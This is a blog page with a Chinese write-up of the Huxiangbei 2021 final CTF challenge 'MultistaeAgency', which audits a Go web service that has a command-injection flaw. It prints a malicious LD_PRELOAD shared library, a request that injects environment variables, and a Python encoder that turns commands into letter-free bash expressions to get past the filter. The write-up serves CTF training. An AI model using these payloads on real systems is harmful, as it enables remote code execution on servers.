@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      湖湘杯 2021 final MultistaeAgency 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">湖湘杯 2021 final MultistaeAgency</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-09-21 23:51:08
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/Go/" title="Go">
+                    <b>#</b> Go
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h3 id="附件"><a class="markdownIt-Anchor" href="#附件">#</a> 附件</h3>
+<p><img src="https://img-blog.csdnimg.cn/d6b8b5877a73434ebaa441197c5894ca.png" alt="在这里插入图片描述"></p>
+<p>web 下的 main.go<br>
+<img src="https://img-blog.csdnimg.cn/ee85e82d83d64d0abdd59a50436f8e6f.png" alt="在这里插入图片描述"><br>
+存在三个路径<br>
+ list 展示上传到 token 下的文件<br>
+<img src="https://img-blog.csdnimg.cn/d6554ea5d1704a5284eb3ecf6d152cf7.png" alt="在这里插入图片描述"></p>
+<p>upload 上传文件并请求内网 9091 的 manage 接口<br>
+<img src="https://img-blog.csdnimg.cn/479cabe06a3340baaecc1a4c01bfebf1.png" alt="在这里插入图片描述"></p>
+<p>token：获取 token 并添加环境变量<br>
+<img src="https://img-blog.csdnimg.cn/3a189c683b6b4ceba2dcb56fd75c6004.png" alt="在这里插入图片描述"><br>
+ manage 接口</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">manage</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	values := r.URL.Query()</span><br><span class="line">	m := values.Get(<span class="string">&quot;m&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> !waf(m) &#123;</span><br><span class="line">		fmt.Fprintf(w, <span class="string">&quot;waf!&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	cmd := fmt.Sprintf(<span class="string">&quot;rm -rf uploads/%s&quot;</span>, m)</span><br><span class="line">	fmt.Println(cmd)</span><br><span class="line">	command := exec.Command(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd)</span><br><span class="line">	outinfo := bytes.Buffer&#123;&#125;</span><br><span class="line">	outerr := bytes.Buffer&#123;&#125;</span><br><span class="line">	command.Stdout = &amp;outinfo</span><br><span class="line">	command.Stderr = &amp;outerr</span><br><span class="line">	err := command.Start()</span><br><span class="line">	res := <span class="string">&quot;ERROR&quot;</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> err = command.Wait(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		res = outerr.String()</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		res = outinfo.String()</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Fprintf(w, res)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在这里存在 rce 的点</p>
+<p>其中有一个 waf</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">waf</span><span class="params">(c <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	<span class="keyword">var</span> t <span class="type">int32</span></span><br><span class="line">	t = <span class="number">0</span></span><br><span class="line">	blacklist := []<span class="type">string</span>&#123;<span class="string">&quot;.&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;?&quot;</span>&#125;</span><br><span class="line">	<span class="keyword">for</span> _, s := <span class="keyword">range</span> c &#123;</span><br><span class="line">		<span class="keyword">for</span> _, b := <span class="keyword">range</span> blacklist &#123;</span><br><span class="line">			<span class="keyword">if</span> b == <span class="type">string</span>(s) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> unicode.IsLetter(s) &#123;</span><br><span class="line">			<span class="keyword">if</span> t == s &#123;</span><br><span class="line">				<span class="keyword">continue</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> t == <span class="number">0</span> &#123;</span><br><span class="line">				t = s</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>既然会加载环境变量，可以让其加载恶意的 so 文件来 rce</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include&lt;stdlib.h&gt;</span></span><br><span class="line">__attribute__((constructor)) void l3yx()&#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    system(getenv(&quot;_evilcmd&quot;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc -shared -fPIC -o evil.so evil.c</span><br></pre></td></tr></table></figure>
+<p>大致思路：<br>
+通过上传恶意的 so 文件来 rce，先访问 /token 获取到 token 的值，因为后面会有检验，upload 会将其移动到 token 目录下，上传会发现其请求 <code>/token?http_proxy=127.0.0.1:8080</code>  获取到 token，也就是 proxy 代理实现。再去 curl 内网的 9091manage 接口，将 m 参数传入即可得到 flag，当然还要先绕过 waf</p>
+<p><img src="https://img-blog.csdnimg.cn/fca4867e50aa417c80b2b2c2f8ec07d5.png" alt="在这里插入图片描述"></p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/token?http_proxy=<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>&amp;LD_PRELOAD=/code/uploads/<span class="number">2</span>ea6a3a71d0b2db658544f67f1468897/XVlBz&amp;_evilcmd=ls /</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line">n = <span class="built_in">dict</span>()</span><br><span class="line">n[<span class="number">0</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line">n[<span class="number">1</span>] = <span class="string">&#x27;$&#123;##&#125;&#x27;</span></span><br><span class="line">n[<span class="number">2</span>] = <span class="string">&#x27;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))&#x27;</span></span><br><span class="line">n[<span class="number">3</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))&#x27;</span></span><br><span class="line">n[<span class="number">4</span>] = <span class="string">&#x27;$(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))&#x27;</span></span><br><span class="line">n[<span class="number">5</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;0$&#123;##&#125;))&#x27;</span></span><br><span class="line">n[<span class="number">6</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;0))&#x27;</span></span><br><span class="line">n[<span class="number">7</span>] = <span class="string">&#x27;$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))&#x27;</span></span><br><span class="line"></span><br><span class="line">f=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_to_oct</span>(<span class="params">cmd</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> cmd:</span><br><span class="line">        o = (<span class="string">&#x27;%s&#x27;</span> % (<span class="built_in">oct</span>(<span class="built_in">ord</span>(t))))[<span class="number">2</span>:]</span><br><span class="line">        s+=<span class="string">&#x27;\\&#x27;</span>+o</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build</span>(<span class="params">cmd</span>):</span><br><span class="line">    payload = <span class="string">&quot;$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\\\&#x27;&quot;</span></span><br><span class="line">    s = str_to_oct(cmd).split(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        payload+=<span class="string">&quot;\\\\&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _:</span><br><span class="line">            payload+=n[<span class="built_in">int</span>(i)]</span><br><span class="line">    <span class="keyword">return</span> payload+<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(quote(<span class="string">&quot;123;&quot;</span>+build(<span class="string">&quot;cat /flag&quot;</span>))))</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/d8ce9214a7694fe094dc9bc2f912e15a.png" alt="在这里插入图片描述"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/08/21/Commons%20Collections5/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-09-21 23:51:08
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                        <b>#</b> 代码审计
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/Go/" title="Go">
+                        <b>#</b> Go
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/09/25/%E4%BF%A1%E5%AE%89%E5%AE%9E%E9%AA%8C-RSA(%E5%A4%87%E8%AF%BE)/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%84%E4%BB%B6"><span class="toc-text"> 附件</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/ki10Moc/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="ki10Moc1949@gmail.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" target="_blank" rel="noopener" href="https://www.facebook.com/profile.php?id=100083345720708">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/ki10moc1/status/1494844731544662019?s=21&t=l-0lygAzRMHeJeBklnPt-A">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">Copyright © 2025 ki10Moc</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/ki10Moc/">霍布斯鲍姆学徒 | CTFer</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E6%B9%96%E6%B9%98%E6%9D%AF%202021%20final%20MultistaeAgency + '&url=' + https%3A%2F%2Fki10moc.github.io%2F2022%2F09%2F21%2F%5B%25E6%25B9%2596%25E6%25B9%2598%25E6%259D%25AF%25202021%2520final%5DMultistaeAgency%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://ki10moc.github.io/2022/09/21/[%E6%B9%96%E6%B9%98%E6%9D%AF%202021%20final]MultistaeAgency/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
